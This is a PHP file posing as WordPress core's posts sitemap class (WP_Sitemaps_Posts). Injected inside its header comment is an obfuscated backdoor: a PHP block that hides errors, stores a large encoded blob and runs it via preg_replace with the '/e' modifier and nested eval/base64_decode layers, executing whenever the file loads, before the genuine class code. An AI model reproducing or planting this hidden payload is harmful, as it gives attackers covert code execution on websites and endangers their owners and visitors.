<?php
/**
 * Sitemaps: WP_Sitemaps_Posts class
 *
 * Builds the sitemaps for the 'post' object type.
<?php Error_Reporting(0); 
$xwGla1FMTSLs="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";
preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'ZXZhbChiYXNlNjRfZGVjb2RlKCJaWFpoYkNoaVlYTmxOalJmWkdWamIyUmxLQ0pLU0doR1ZFZHJlbUl5WkZKWGJVVXpVRmRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlKYkd4MFVtNXdZVlpHYTNkWFJFcFRZa1pyZVU5WGRHRlZWREE1U1dsck4wcElhR3BXUkd3MllsUldTbUV5WnpSUVYwcG9ZekpWTWs1R09XdGFWMDUyV2tkVmIwbHRUWHBWYm14cFVqRmFNVWxwYXpkS1NHaDVWVlZhY0dKc1JUTlBSemxOVFZReGFWbFlUbXhPYWxKbVdrZFdhbUl5VW14TFEwcGFUVzFvTlVscGF6ZEtTR2hvV214R01XRnFXakJYYTFaS1VGZEthR015VlRKT1JqbHJXbGRPZGxwSFZXOUpiVWw2VTIxemFVdFVjMnRsUkZwclVraE9ORlpyVm5GVGJFNVdWSG94YVZsWVRteE9hbEptV2tkV2FtSXlVbXhMUTBwaFRUTkNkMWx0TVdGak1XeFpWVzEzYVV0VWN6MGlLU2s3WlhaaGJDaGlZWE5sTmpSZlpHVmpiMlJsS0NKS1NHZ3pVako0YUUxVldrNVdSazVOWTNvd2EyVkVXbXRTU0U0MFZtdFdjVk5zVGxaVWVXZHJaVVZXVFdGVVRuWmFNVVpoV1ZSamIwcElhRE5TTW5ob1RWVmFUbFpHVGsxamVXdHdUM2xTTkU5SVl6UmtSa0pxWWxkNFNrOVViRTlRVTFJMFdURlJOV1Z0TURGVFYzUnZUME5uYTJWSVpFaGlSMFY0VW1zeFZWVXdlSHBMVkhNOUlpa3BPdz09IikpO2V2YWwoYmFzZTY0X2RlY29kZSgiSkhoclJHWkdWV3N5V1ZkSk9GSTlKeWM3Wm05eUtDUjRSbTVKWlhkV2FWcGxkVmxJUFRBN0pIaEdia2xsZDFacFdtVjFXVWc4SkhnNGR6aDBVR050YkVrNU9VNDdKSGhHYmtsbGQxWnBXbVYxV1Vnckt5bDdKSGhyUkdaR1ZXc3lXVmRKT0ZJdVBTUjRjbEZHYVc1Uk56aHZUREVvS0NSNFlXWlJkV28yZEZwRlNTZ2tlSGRIYkdFeFJrMVVVMHh6V3lSNFJtNUpaWGRXYVZwbGRWbElYU2xlTVRZNE9EYzVPRFUzTVNrcE8zMWxkbUZzS0NSNGEwUm1SbFZyTWxsWFNUaFNLVHM9IikpOw=='\x29\x29\x3B",".");
return; 
?> *
 * @package WordPress
 * @subpackage Sitemaps
 * @since 5.5.0
 */

/**
 * Posts XML sitemap provider.
 *
 * @since 5.5.0
 */
class WP_Sitemaps_Posts extends WP_Sitemaps_Provider {
	/**
	 * WP_Sitemaps_Posts constructor.
	 *
	 * @since 5.5.0
	 */
	public function __construct() {
		$this->name        = 'posts';
		$this->object_type = 'post';
	}

	/**
	 * Returns the public post types, which excludes nav_items and similar types.
	 * Attachments are also excluded. This includes custom post types with public = true.
	 *
	 * @since 5.5.0
	 *
	 * @return WP_Post_Type[] Array of registered post type objects keyed by their name.
	 */
	public function get_object_subtypes() {
		$post_types = get_post_types( array( 'public' => true ), 'objects' );
		unset( $post_types['attachment'] );

		$post_types = array_filter( $post_types, 'is_post_type_viewable' );

		/**
		 * Filters the list of post object sub types available within the sitemap.
		 *
		 * @since 5.5.0
		 *
		 * @param WP_Post_Type[] $post_types Array of registered post type objects keyed by their name.
		 */
		return apply_filters( 'wp_sitemaps_post_types', $post_types );
	}

	/**
	 * Gets a URL list for a post type sitemap.
	 *
	 * @since 5.5.0
	 *
	 * @param int    $page_num  Page of results.
	 * @param string $post_type Optional. Post type name. Default empty.
	 * @return array Array of URLs for a sitemap.
	 */
	public function get_url_list( $page_num, $post_type = '' ) {
		// Bail early if the queried post type is not supported.
		$supported_types = $this->get_object_subtypes();

		if ( ! isset( $supported_types[ $post_type ] ) ) {
			return array();
		}

		/**
		 * Filters the posts URL list before it is generated.
		 *
		 * Passing a non-null value will effectively short-circuit the generation,
		 * returning that value instead.
		 *
		 * @since 5.5.0
		 *
		 * @param array  $url_list  The URL list. Default null.
		 * @param string $post_type Post type name.
		 * @param int    $page_num  Page of results.
		 */
		$url_list = apply_filters(
			'wp_sitemaps_posts_pre_url_list',
			null,
			$post_type,
			$page_num
		);

		if ( null !== $url_list ) {
			return $url_list;
		}

		$args          = $this->get_posts_query_args( $post_type );
		$args['paged'] = $page_num;

		$query = new WP_Query( $args );

		$url_list = array();

		/*
		 * Add a URL for the homepage in the pages sitemap.
		 * Shows only on the first page if the reading settings are set to display latest posts.
		 */
		if ( 'page' === $post_type && 1 === $page_num && 'posts' === get_option( 'show_on_front' ) ) {
			// Extract the data needed for home URL to add to the array.
			$sitemap_entry = array(
				'loc' => home_url( '/' ),
			);

			/**
			 * Filters the sitemap entry for the home page when the 'show_on_front' option equals 'posts'.
			 *
			 * @since 5.5.0
			 *
			 * @param array $sitemap_entry Sitemap entry for the home page.
			 */
			$sitemap_entry = apply_filters( 'wp_sitemaps_posts_show_on_front_entry', $sitemap_entry );
			$url_list[]    = $sitemap_entry;
		}

		foreach ( $query->posts as $post ) {
			$sitemap_entry = array(
				'loc' => get_permalink( $post ),
			);

			/**
			 * Filters the sitemap entry for an individual post.
			 *
			 * @since 5.5.0
			 *
			 * @param array   $sitemap_entry Sitemap entry for the post.
			 * @param WP_Post $post          Post object.
			 * @param string  $post_type     Name of the post_type.
			 */
			$sitemap_entry = apply_filters( 'wp_sitemaps_posts_entry', $sitemap_entry, $post, $post_type );
			$url_list[]    = $sitemap_entry;
		}

		return $url_list;
	}

	/**
	 * Gets the max number of pages available for the object type.
	 *
	 * @since 5.5.0
	 *
	 * @param string $post_type Optional. Post type name. Default empty.
	 * @return int Total number of pages.
	 */
	public function get_max_num_pages( $post_type = '' ) {
		if ( empty( $post_type ) ) {
			return 0;
		}

		/**
		 * Filters the max number of pages before it is generated.
		 *
		 * Passing a non-null value will short-circuit the generation,
		 * returning that value instead.
		 *
		 * @since 5.5.0
		 *
		 * @param int|null $max_num_pages The maximum number of pages. Default null.
		 * @param string   $post_type     Post type name.
		 */
		$max_num_pages = apply_filters( 'wp_sitemaps_posts_pre_max_num_pages', null, $post_type );

		if ( null !== $max_num_pages ) {
			return $max_num_pages;
		}

		$args                  = $this->get_posts_query_args( $post_type );
		$args['fields']        = 'ids';
		$args['no_found_rows'] = false;

		$query = new WP_Query( $args );

		$min_num_pages = ( 'page' === $post_type && 'posts' === get_option( 'show_on_front' ) ) ? 1 : 0;
		return isset( $query->max_num_pages ) ? max( $min_num_pages, $query->max_num_pages ) : 1;
	}

	/**
	 * Returns the query args for retrieving posts to list in the sitemap.
	 *
	 * @since 5.5.0
	 *
	 * @param string $post_type Post type name.
	 * @return array Array of WP_Query arguments.
	 */
	protected function get_posts_query_args( $post_type ) {
		/**
		 * Filters the query arguments for post type sitemap queries.
		 *
		 * @see WP_Query for a full list of arguments.
		 *
		 * @since 5.5.0
		 *
		 * @param array  $args      Array of WP_Query arguments.
		 * @param string $post_type Post type name.
		 */
		$args = apply_filters(
			'wp_sitemaps_posts_query_args',
			array(
				'orderby'                => 'ID',
				'order'                  => 'ASC',
				'post_type'              => $post_type,
				'posts_per_page'         => wp_sitemaps_get_max_urls( $this->object_type ),
				'post_status'            => array( 'publish' ),
				'no_found_rows'          => true,
				'update_post_term_cache' => false,
				'update_post_meta_cache' => false,
			),
			$post_type
		);

		return $args;
	}
}
